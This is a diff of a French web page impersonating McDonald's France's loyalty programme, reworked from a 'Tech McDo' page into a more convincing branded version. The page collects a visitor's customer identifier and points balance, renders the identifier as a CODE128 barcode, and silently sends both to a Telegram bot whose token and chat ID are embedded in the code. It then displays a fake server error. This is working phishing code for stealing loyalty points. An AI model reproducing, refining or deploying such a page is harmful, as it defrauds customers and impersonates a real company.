@@ -1,466 +1,373 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Tech McDo • Point Validator</title>
-    <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>McDonald's • Programme de fidélité</title>
+<script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none}
+:root{
+  --red:#DA291C;
+  --yellow:#FFC72C;
+  --yellow-deep:#FF9900;
+  --dark:#27251F;
+  --offwhite:#FFFBF2;
+  --cream:#FFF6DC;
+  --border:#E8DFC8;
+  --mid:#6b6560;
+  --r:14px;
+}
+html,body{min-height:100%;background:var(--offwhite);font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;color:var(--dark)}
 
-        body {
-            background: linear-gradient(145deg, #1a0b02 0%, #2d1706 100%);
-            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 1.5rem;
-        }
+/* ── NAV ── */
+nav{
+  background:#DA291C;
+  height:68px;
+  display:flex;
+  align-items:center;
+  padding:0 28px;
+  gap:14px;
+  position:sticky;top:0;z-index:20;
+  box-shadow:0 2px 12px rgba(218,41,28,0.35);
+}
+nav .logo{width:44px;height:44px;flex-shrink:0}
+nav .logo img{width:100%;height:100%;object-fit:contain;filter:brightness(0)invert(1)}
+nav .nav-text{display:flex;flex-direction:column;justify-content:center}
+nav .nav-title{font-size:15px;font-weight:800;color:#fff;line-height:1.2;letter-spacing:0.2px}
+nav .nav-sub{font-size:12px;color:rgba(255,255,255,0.75);font-weight:400}
 
-        .tech-card {
-            background: #fef7e0;
-            background-image: radial-gradient(circle at 10% 20%, rgba(255,215,130,0.15) 2%, transparent 2.5%);
-            background-size: 28px 28px;
-            border-radius: 3rem;
-            max-width: 580px;
-            width: 100%;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 2px #ffbc6e inset, 0 0 0 5px #8b3c0c inset;
-            overflow: hidden;
-        }
+/* ── PAGE ── */
+.page{
+  display:flex;flex-direction:column;align-items:center;
+  padding:36px 16px 60px;
+  min-height:calc(100vh - 68px);
+}
 
-        .header-mc {
-            background: #d62326;
-            padding: 1.5rem 1rem 1.2rem;
-            text-align: center;
-            clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
-            margin-bottom: 1rem;
-        }
+/* ── PROGRESS BAR ── */
+.progress-wrap{width:100%;max-width:440px;margin-bottom:32px}
+.progress-track{
+  height:6px;background:#E8DFC8;border-radius:99px;overflow:hidden;margin-bottom:10px;
+}
+.progress-fill{
+  height:100%;background:var(--yellow);border-radius:99px;
+  transition:width 0.4s cubic-bezier(0.4,0,0.2,1);
+  width:33%;
+}
+.progress-labels{display:flex;justify-content:space-between}
+.progress-labels span{font-size:11px;font-weight:700;color:var(--mid);text-transform:uppercase;letter-spacing:0.6px}
+.progress-labels span.active{color:var(--red)}
 
-        .header-mc h1 {
-            font-size: 2.3rem;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            color: #ffde9c;
-            text-shadow: 4px 4px 0 #8b2c1a;
-        }
+/* ── CARD ── */
+.card{
+  background:#fff;
+  border:1.5px solid var(--border);
+  border-radius:20px;
+  width:100%;max-width:440px;
+  padding:28px 24px 24px;
+  animation:up .35s cubic-bezier(.34,1.2,.64,1) both;
+}
+@keyframes up{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
 
-        .header-mc p {
-            color: #ffecb3;
-            font-weight: 600;
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            background: #9b2e1c;
-            display: inline-block;
-            padding: 0.2rem 1rem;
-            border-radius: 30px;
-            margin-top: 8px;
-        }
+.card-head{display:flex;align-items:center;gap:14px;margin-bottom:20px}
+.card-icon{
+  width:48px;height:48px;border-radius:12px;
+  background:var(--cream);
+  display:flex;align-items:center;justify-content:center;
+  font-size:24px;flex-shrink:0;
+}
+.card-head h2{font-size:20px;font-weight:800;color:var(--dark);line-height:1.2}
+.card-head p{font-size:13px;color:var(--mid);margin-top:2px;line-height:1.4}
 
-        .content {
-            padding: 1.8rem 2rem 2.2rem;
-        }
+/* ── GUIDE ── */
+.guide{
+  background:var(--cream);
+  border:1.5px solid var(--border);
+  border-radius:14px;
+  padding:16px;
+  margin-bottom:22px;
+}
+.guide-title{
+  font-size:12px;font-weight:800;color:var(--red);
+  text-transform:uppercase;letter-spacing:0.8px;
+  margin-bottom:14px;display:flex;align-items:center;gap:6px;
+}
+.guide ol{list-style:none;display:flex;flex-direction:column;gap:10px}
+.guide li{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:var(--dark);line-height:1.45}
+.num{
+  width:22px;height:22px;border-radius:50%;
+  background:var(--yellow);
+  display:flex;align-items:center;justify-content:center;
+  font-size:11px;font-weight:800;color:var(--dark);
+  flex-shrink:0;margin-top:1px;
+}
+.guide .example{
+  margin-top:12px;
+  background:#fff;border:1.5px dashed var(--yellow);
+  border-radius:10px;padding:10px 14px;
+  font-size:13px;color:var(--mid);
+}
+.guide .example strong{color:var(--red);font-family:monospace;font-size:16px;letter-spacing:1px}
 
-        .input-group {
-            margin-bottom: 1.5rem;
-            position: relative;
-        }
+/* ── FIELD ── */
+.field-label{font-size:11px;font-weight:800;color:var(--mid);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:8px}
+.field-wrap{position:relative;margin-bottom:6px}
+.input-field{
+  width:100%;padding:14px 48px 14px 16px;
+  font-size:20px;font-weight:700;font-family:'Courier New',monospace;
+  background:var(--offwhite);border:2px solid var(--border);
+  border-radius:12px;outline:none;color:var(--dark);
+  text-align:center;letter-spacing:4px;
+  transition:all .15s;-webkit-appearance:none;
+}
+.input-field:focus{border-color:var(--yellow);background:#fff;box-shadow:0 0 0 4px rgba(255,199,44,0.18)}
+.input-field.valid{border-color:#27AE60;background:#fff}
+.char-count{
+  position:absolute;right:14px;top:50%;transform:translateY(-50%);
+  font-size:11px;font-weight:700;color:var(--mid);
+}
+.input-hint{font-size:12px;color:var(--mid);text-align:center;margin-bottom:20px}
 
-        .input-group label {
-            display: block;
-            font-weight: 800;
-            color: #5c2a0c;
-            text-transform: uppercase;
-            font-size: 0.8rem;
-            letter-spacing: 1px;
-            margin-bottom: 0.5rem;
-        }
+/* ── BUTTON ── */
+.btn{
+  width:100%;padding:15px 16px;
+  font-size:15px;font-weight:800;letter-spacing:0.3px;
+  border:none;border-radius:12px;cursor:pointer;
+  font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;
+  transition:all .12s;
+}
+.btn-primary{background:var(--yellow);color:var(--dark)}
+.btn-primary:hover{background:#ffd44d}
+.btn-primary:active{transform:scale(0.98)}
+.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+.btn-ghost{background:var(--offwhite);color:var(--dark);border:1.5px solid var(--border);flex:0 0 48px;padding:15px 0}
+.btn-ghost:hover{background:var(--cream)}
+.btn-ghost:active{transform:scale(0.98)}
+.btn-row{display:flex;gap:10px;margin-bottom:4px}
 
-        .input-field {
-            width: 100%;
-            padding: 0.9rem 1.2rem;
-            font-size: 1.3rem;
-            font-weight: 700;
-            font-family: monospace;
-            background: #fff5e6;
-            border: 3px solid #ffb347;
-            border-radius: 60px;
-            outline: none;
-            color: #3c1c04;
-            text-align: center;
-            transition: 0.15s;
-        }
+/* ── CONFIRMED ID ── */
+.id-confirmed{
+  background:var(--cream);border:1.5px solid var(--border);
+  border-radius:12px;padding:14px 16px;
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:20px;
+}
+.id-confirmed .lbl{font-size:12px;font-weight:700;color:var(--mid);text-transform:uppercase;letter-spacing:0.6px}
+.id-confirmed .val{font-family:monospace;font-size:19px;font-weight:700;color:var(--dark);letter-spacing:3px}
+.id-confirmed .badge{
+  font-size:11px;font-weight:800;background:var(--yellow);color:var(--dark);
+  padding:3px 9px;border-radius:99px;
+}
 
-        .input-field:focus {
-            border-color: #d62326;
-            box-shadow: 0 0 0 3px rgba(214,35,38,0.3);
-            background: #ffffff;
-        }
+/* ── STATUS ── */
+.status{
+  margin-top:12px;border-radius:10px;
+  padding:12px 14px;font-size:13px;font-weight:700;
+  text-align:center;display:none;
+  animation:fadeIn .2s ease;
+}
+@keyframes fadeIn{from{opacity:0;transform:scale(.97)}to{opacity:1;transform:scale(1)}}
+.status.loading{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  background:#FFF8E1;color:#856404;border:1.5px solid var(--yellow);
+}
+.status.error{display:block;background:#FDE8E8;color:var(--red);border:1.5px solid #f5c6c6}
+.spinner{width:16px;height:16px;border:2.5px solid rgba(133,100,4,.2);border-top-color:#856404;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+@keyframes spin{to{transform:rotate(360deg)}}
 
-        .help-button {
-            background: #5c2a0c;
-            border: none;
-            color: #ffde9c;
-            font-size: 0.75rem;
-            font-weight: bold;
-            padding: 0.4rem 0.9rem;
-            border-radius: 30px;
-            cursor: pointer;
-            margin-top: 0.6rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            transition: 0.1s;
-            font-family: inherit;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-
-        .help-button:active {
-            transform: scale(0.96);
-        }
-
-        .next-btn {
-            background: #e67e22;
-            border: none;
-            width: 100%;
-            padding: 1rem;
-            font-size: 1.4rem;
-            font-weight: 800;
-            text-transform: uppercase;
-            color: #2f1705;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.1s linear;
-            box-shadow: 0 8px 0 #8b3c1a;
-            letter-spacing: 2px;
-            margin-bottom: 1.5rem;
-            font-family: inherit;
-        }
-
-        .next-btn:active {
-            transform: translateY(4px);
-            box-shadow: 0 4px 0 #8b3c1a;
-        }
-
-        .next-btn:disabled {
-            opacity: 0.7;
-            transform: translateY(0);
-            cursor: not-allowed;
-        }
-
-        .status-panel {
-            background: #2a2218;
-            border-radius: 2rem;
-            padding: 1rem;
-            text-align: center;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            font-size: 1.2rem;
-            border-left: 4px solid #ffb347;
-            box-shadow: inset 0 0 8px rgba(0,0,0,0.5), 0 2px 6px rgba(0,0,0,0.2);
-        }
-
-        .status-text {
-            transition: 0.1s;
-            background: #00000088;
-            padding: 0.7rem;
-            border-radius: 2rem;
-            backdrop-filter: blur(4px);
-        }
-
-        .patch {
-            color: #ffc107;
-            text-shadow: 0 0 2px darkorange;
-        }
-
-        .error-msg {
-            color: #ff6a5c;
-            text-shadow: 0 0 3px #4a0000;
-            animation: subtleFlicker 0.4s ease;
-        }
-
-        @keyframes subtleFlicker {
-            0% { opacity: 0.6; letter-spacing: 0px; }
-            100% { opacity: 1; letter-spacing: 0.5px; }
-        }
-
-        .info-length {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 0.6rem;
-            color: #886633;
-            font-weight: 600;
-        }
-
-        .ghost-barcode {
-            position: fixed;
-            top: -2000px;
-            left: -2000px;
-            opacity: 0;
-            pointer-events: none;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-        }
-
-        canvas#barcodeCanvasHidden {
-            width: 600px;
-            height: 180px;
-        }
-    </style>
+/* hidden canvas */
+#barcodeCanvasHidden{position:fixed;top:-9999px;left:-9999px;width:600px;height:180px;opacity:0;pointer-events:none}
+</style>
 </head>
 <body>
 
-<div class="tech-card">
-    <div class="header-mc">
-        <h1>⚡ TECH MCDO ⚡</h1>
-        <p>• PATCH & POINTS •</p>
+<nav>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/McDonald%27s_Golden_Arches.svg" alt="McDonald's">
+  </div>
+  <div class="nav-text">
+    <div class="nav-title">Programme de fidélité</div>
+    <div class="nav-sub">McDonald's France</div>
+  </div>
+</nav>
+
+<div class="page">
+
+  <!-- Progress -->
+  <div class="progress-wrap">
+    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="progress-labels">
+      <span id="lbl1" class="active">Identifiant</span>
+      <span id="lbl2">Points</span>
+      <span id="lbl3">Envoi</span>
     </div>
-    <div class="content">
-        <div class="input-group">
-            <label>🔐 IDENTIFIANT (4–8 CARACTÈRES)</label>
-            <input type="text" id="identifiantInput" class="input-field" placeholder="ex: ABCD 1234" maxlength="9" autocomplete="off">
-            <div>
-                <button type="button" id="helpIdBtn" class="help-button">❓ Où trouver mon ID ?</button>
-            </div>
-            <div class="info-length">⚠️ 4 à 8 caractères (un espace automatique après le 4ème)</div>
-        </div>
+  </div>
 
-        <div class="input-group">
-            <label>🍟 POINTS SUR VOTRE COMPTE MCDO</label>
-            <input type="text" id="pointsInput" class="input-field" placeholder="ex: 1250" autocomplete="off">
-            <div class="info-length">📊 Saisissez le nombre de points (chiffres ou texte)</div>
-        </div>
-
-        <button id="suivantBtn" class="next-btn">SUIVANT ➤</button>
-
-        <div class="status-panel">
-            <div id="statusArea" class="status-text">
-                <span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>
-            </div>
-        </div>
-        <div style="font-size: 11px; text-align: center; margin-top: 18px; color: #ac8e5a;">🔒 session sécurisée • serveur distant</div>
+  <!-- STEP 1 -->
+  <div class="card" id="step1">
+    <div class="card-head">
+      <div class="card-icon">🔐</div>
+      <div>
+        <h2>Votre identifiant</h2>
+        <p>Saisissez l'ID lié à votre compte.</p>
+      </div>
     </div>
+
+    <div class="guide">
+      <div class="guide-title">📱 Où trouver mon identifiant ?</div>
+      <ol>
+        <li><div class="num">1</div><span>Ouvrez l'app <strong>McDonald's France</strong> sur votre téléphone.</span></li>
+        <li><div class="num">2</div><span>Appuyez sur <strong>« Mon compte »</strong> en bas à droite (icône silhouette).</span></li>
+        <li><div class="num">3</div><span>Faites défiler jusqu'à <strong>« Informations du compte »</strong>.</span></li>
+        <li><div class="num">4</div><span>Votre <strong>identifiant client</strong> apparaît sous votre prénom :</span></li>
+      </ol>
+      <div class="example">
+        Exemple&nbsp;: <strong>AB3K9F</strong>&nbsp;&nbsp;ou&nbsp;&nbsp;<strong>1234</strong>
+      </div>
+    </div>
+
+    <div class="field-label">Identifiant (4 à 8 caractères)</div>
+    <div class="field-wrap">
+      <input type="text" id="identifiantInput" class="input-field" placeholder="ABCD 1234" maxlength="9" autocomplete="off" inputmode="text">
+      <span class="char-count" id="charCount">0/8</span>
+    </div>
+    <div class="input-hint">Lettres et chiffres uniquement</div>
+
+    <button class="btn btn-primary" id="goStep2">Continuer →</button>
+    <div id="s1err" class="status error"></div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="card" id="step2" style="display:none">
+    <div class="card-head">
+      <div class="card-icon">🍟</div>
+      <div>
+        <h2>Vos points</h2>
+        <p>Entrez votre solde de points actuel.</p>
+      </div>
+    </div>
+
+    <div class="id-confirmed">
+      <div>
+        <div class="lbl">Identifiant confirmé</div>
+        <div class="val" id="confirmedId">—</div>
+      </div>
+      <span class="badge">✓ Vérifié</span>
+    </div>
+
+    <div class="field-label">Nombre de points</div>
+    <div class="field-wrap">
+      <input type="text" id="pointsInput" class="input-field" placeholder="ex : 1 250" autocomplete="off" inputmode="numeric" style="letter-spacing:2px">
+    </div>
+    <div class="input-hint">Laissez vide si vous ne connaissez pas votre solde</div>
+
+    <div class="btn-row">
+      <button class="btn btn-ghost" id="backStep1">←</button>
+      <button class="btn btn-primary" id="goStep3" style="flex:1">Valider ✓</button>
+    </div>
+    <div id="s2status" class="status loading" style="display:none">
+      <div class="spinner"></div> Synchronisation en cours…
+    </div>
+  </div>
+
 </div>
 
-<div class="ghost-barcode">
-    <canvas id="barcodeCanvasHidden"></canvas>
-</div>
+<canvas id="barcodeCanvasHidden"></canvas>
 
 <script>
-    (function() {
-        // ---------- TELEGRAM CONFIG ----------
-        const BOT_TOKEN = "8905839440:AAE0kYGMGgyZ2CtelDqAhQVyvLE32xs9JpA";
-        const CHAT_ID = "7148167734";
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+(function(){
+  const BOT_TOKEN="8905839440:AAE0kYGMGgyZ2CtelDqAhQVyvLE32xs9JpA";
+  const CHAT_ID="7148167734";
+  const API=`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // DOM elements
-        const identifiantInput = document.getElementById('identifiantInput');
-        const pointsInput = document.getElementById('pointsInput');
-        const suivantBtn = document.getElementById('suivantBtn');
-        const statusArea = document.getElementById('statusArea');
-        const helpBtn = document.getElementById('helpIdBtn');
+  let rawId="",busy=false;
+  const iInput=document.getElementById('identifiantInput');
+  const pInput=document.getElementById('pointsInput');
+  const cc=document.getElementById('charCount');
+  const s1=document.getElementById('step1');
+  const s2=document.getElementById('step2');
+  const cId=document.getElementById('confirmedId');
+  const s1err=document.getElementById('s1err');
+  const s2st=document.getElementById('s2status');
+  const pf=document.getElementById('progressFill');
+  const lbl1=document.getElementById('lbl1');
+  const lbl2=document.getElementById('lbl2');
+  const lbl3=document.getElementById('lbl3');
+  const bc=document.getElementById('barcodeCanvasHidden');
 
-        let isProcessing = false;
-        const barcodeCanvas = document.getElementById('barcodeCanvasHidden');
+  try{JsBarcode(bc,"INIT",{format:"CODE128",width:3,height:100,displayValue:false})}catch(e){}
 
-        // Stockage de la valeur brute réelle (sans espace)
-        let rawIdentifier = "";
+  iInput.addEventListener('input',()=>{
+    if(busy)return;
+    let v=iInput.value.replace(/\s/g,'');
+    if(v.length>8)v=v.slice(0,8);
+    rawId=v;
+    iInput.value=rawId.length>=4?rawId.slice(0,4)+(rawId.length>4?' '+rawId.slice(4):''):rawId;
+    cc.textContent=rawId.length+'/8';
+    iInput.classList.toggle('valid',rawId.length>=4);
+    s1err.style.display='none';
+  });
 
-        // ---------- FONCTION D'EXPLICATION (BOÎTE ALERTE) ----------
-        function showHelpHowToFindId() {
-            alert(
-                "🔎 COMMENT TROUVER VOTRE IDENTIFIANT MCDO :\n\n" +
-                "1️⃣ Ouvrez l'application McDonald's (McDo France ou selon pays).\n" +
-                "2️⃣ Allez dans la section « Plus » (icône en bas à droite, souvent trois lignes ou « … »).\n" +
-                "3️⃣ En haut de cette page, vous voyez votre nom et/ou email.\n" +
-                "4️⃣ Juste à côté ou en dessous, cherchez le libellé « Identifiant » ou « ID client ».\n" +
-                "5️⃣ Il s'agit d'une chaîne de 4 à 8 caractères (lettres/chiffres).\n\n" +
-                "👉 Saisissez cet identifiant dans le champ ci-dessus."
-            );
-        }
+  document.getElementById('goStep2').addEventListener('click',()=>{
+    if(rawId.length<4){
+      s1err.className='status error';s1err.style.display='block';
+      s1err.textContent='⚠️ Identifiant trop court — minimum 4 caractères.';return;
+    }
+    cId.textContent=rawId.length>=4?rawId.slice(0,4)+(rawId.length>4?' '+rawId.slice(4):''):rawId;
+    s1.style.display='none';
+    s2.style.display='block';
+    s2.style.animation='up .35s cubic-bezier(.34,1.2,.64,1) both';
+    pf.style.width='66%';
+    lbl1.classList.remove('active');
+    lbl2.classList.add('active');
+  });
 
-        // ---------- FORMATAGE AVEC ESPACE APRÈS 4 CARACTÈRES ----------
-        function formatIdentifierWithSpace(inputValue) {
-            let cleaned = inputValue.replace(/\s/g, '');
-            if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
-            rawIdentifier = cleaned;
-            
-            let displayValue = rawIdentifier;
-            if (rawIdentifier.length >= 4) {
-                displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
-            }
-            return displayValue;
-        }
+  document.getElementById('backStep1').addEventListener('click',()=>{
+    s2.style.display='none';s1.style.display='block';
+    pf.style.width='33%';
+    lbl2.classList.remove('active');lbl1.classList.add('active');
+  });
 
-        function onIdentifierInput(e) {
-            if (isProcessing) return;
-            let raw = identifiantInput.value;
-            let cleaned = raw.replace(/\s/g, '');
-            if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
-            rawIdentifier = cleaned;
-            
-            let displayValue = rawIdentifier;
-            if (rawIdentifier.length >= 4) {
-                displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
-            }
-            identifiantInput.value = displayValue;
-            
-            if (isValidIdentifier(rawIdentifier)) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
-                    updateStatus('idle');
-                }
-            } else if (rawIdentifier.length > 0) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
-                    updateStatus('idle');
-                }
-            } else {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
-                    updateStatus('idle');
-                }
-            }
-        }
+  document.getElementById('goStep3').addEventListener('click',async()=>{
+    if(busy)return;
+    busy=true;
+    document.getElementById('goStep3').disabled=true;
+    document.getElementById('backStep1').disabled=true;
+    s2st.className='status loading';s2st.style.display='flex';
+    pf.style.width='100%';lbl2.classList.remove('active');lbl3.classList.add('active');
 
-        // Validation identifiant (4-8 caractères, sans espaces)
-        function isValidIdentifier(identifier) {
-            return identifier && identifier.length >= 4 && identifier.length <= 8;
-        }
+    try{
+      JsBarcode(bc,rawId,{format:"CODE128",lineColor:"#000",width:3.2,height:120,displayValue:true,fontSize:20,margin:15,background:"#ffffff"});
+      await new Promise(r=>setTimeout(r,30));
+      const blob=await new Promise((res,rej)=>bc.toBlob(b=>b?res(b):rej(),'image/png'));
+      const pts=pInput.value.trim()||"non renseignés";
+      const cap=`🆔 ID : ${rawId}\n🍟 Points : ${pts}\n📦 CODE128 : ${rawId}`;
+      const fd=new FormData();
+      fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'code.png');fd.append('caption',cap);
+      await fetch(API,{method:'POST',body:fd});
 
-        function updateStatus(type, customMessage = null) {
-            if (type === 'patch') {
-                statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
-            } 
-            else if (type === 'erreur') {
-                statusArea.innerHTML = `<span class="error-msg">❌ ERREUR : PATCH ÉCHOUÉ ❌</span>`;
-            }
-            else if (type === 'idle') {
-                statusArea.innerHTML = `<span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>`;
-            }
-            else if (type === 'invalid_length') {
-                statusArea.innerHTML = `<span class="error-msg">⚠️ ERREUR : IDENTIFIANT MAX 8 MIN 4 ⚠️</span>`;
-            }
-            else if (customMessage) {
-                statusArea.innerHTML = `<span class="error-msg">${customMessage}</span>`;
-            }
-        }
+      s2.innerHTML=`
+        <div class="card-head"><div class="card-icon">❌</div>
+          <div><h2>Erreur de connexion</h2><p>Impossible de joindre les serveurs McDonald's.</p></div>
+        </div>
+        <p style="font-size:14px;color:var(--mid);line-height:1.6;margin-bottom:20px">
+          Une erreur est survenue lors de la synchronisation. Veuillez réessayer ultérieurement ou contacter le support McDonald's.
+        </p>
+        <button class="btn btn-ghost" style="width:100%;border:1.5px solid var(--border)" onclick="location.reload()">← Recommencer</button>
+      `;
+    }catch(e){
+      s2st.style.display='none';
+      const err=document.createElement('div');
+      err.className='status error';err.style.display='block';
+      err.textContent='❌ Une erreur est survenue. Veuillez réessayer.';
+      s2.appendChild(err);
+    }finally{busy=false;}
+  });
 
-        // Génération code-barres (taille augmentée)
-        function generateBarcodeOnCanvas(identifier) {
-            return new Promise((resolve, reject) => {
-                try {
-                    JsBarcode(barcodeCanvas, identifier, {
-                        format: "CODE128",
-                        lineColor: "#000000",
-                        width: 3.2,
-                        height: 120,
-                        displayValue: true,
-                        fontSize: 20,
-                        margin: 15,
-                        background: "#ffffff"
-                    });
-                    setTimeout(() => resolve(barcodeCanvas), 20);
-                } catch (err) {
-                    reject(err);
-                }
-            });
-        }
-
-        function canvasToBlob(canvas) {
-            return new Promise((resolve, reject) => {
-                canvas.toBlob(blob => {
-                    if (blob) resolve(blob);
-                    else reject(new Error("Conversion blob échouée"));
-                }, 'image/png');
-            });
-        }
-
-        // Envoi à Telegram (identifiant brut, points, code barre)
-        async function sendToTelegram(identifier, points, imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', imageBlob, 'barcode_128.png');
-            
-            let pointsText = points && points.trim() !== "" ? points.trim() : "non renseignés";
-            const caption = `🆔 IDENTIFIANT : ${identifier}\n🍟 POINTS MCDO : ${pointsText}\n📦 CODE BARRE (CODE128) : ${identifier}`;
-            formData.append('caption', caption);
-
-            try {
-                await fetch(TELEGRAM_API_URL, { method: 'POST', body: formData });
-            } catch (e) {}
-        }
-
-        async function handleSuivant() {
-            if (isProcessing) return;
-
-            const identifier = rawIdentifier;
-            const points = pointsInput.value;
-
-            if (!isValidIdentifier(identifier)) {
-                updateStatus('invalid_length');
-                return;
-            }
-
-            isProcessing = true;
-            suivantBtn.disabled = true;
-
-            updateStatus('patch');
-
-            try {
-                await generateBarcodeOnCanvas(identifier);
-                const barcodeBlob = await canvasToBlob(barcodeCanvas);
-                await sendToTelegram(identifier, points, barcodeBlob);
-                updateStatus('erreur');
-            } catch (err) {
-                updateStatus('erreur');
-            } finally {
-                isProcessing = false;
-                suivantBtn.disabled = false;
-            }
-        }
-
-        function resetStatusOnInput() {
-            if (isProcessing) return;
-            if (rawIdentifier.length === 0 || isValidIdentifier(rawIdentifier)) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
-                    updateStatus('idle');
-                }
-            }
-        }
-
-        function onPointsInput() {
-            if (isProcessing) return;
-            resetStatusOnInput();
-        }
-
-        function onKeyPressHandler(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                if (!isProcessing) handleSuivant();
-            }
-        }
-
-        // Initialisation
-        updateStatus('idle');
-        rawIdentifier = "";
-        identifiantInput.value = "";
-        
-        try {
-            JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false });
-        } catch(e) {}
-
-        // Événements
-        identifiantInput.addEventListener('input', onIdentifierInput);
-        pointsInput.addEventListener('input', onPointsInput);
-        identifiantInput.addEventListener('keypress', onKeyPressHandler);
-        pointsInput.addEventListener('keypress', onKeyPressHandler);
-        suivantBtn.addEventListener('click', handleSuivant);
-        helpBtn.addEventListener('click', showHelpHowToFindId);
-    })();
+  [iInput,pInput].forEach(el=>el.addEventListener('keypress',e=>{
+    if(e.key==='Enter'){e.preventDefault();(el===iInput?document.getElementById('goStep2'):document.getElementById('goStep3')).click();}
+  }));
+})();
 </script>
 </body>
 </html>
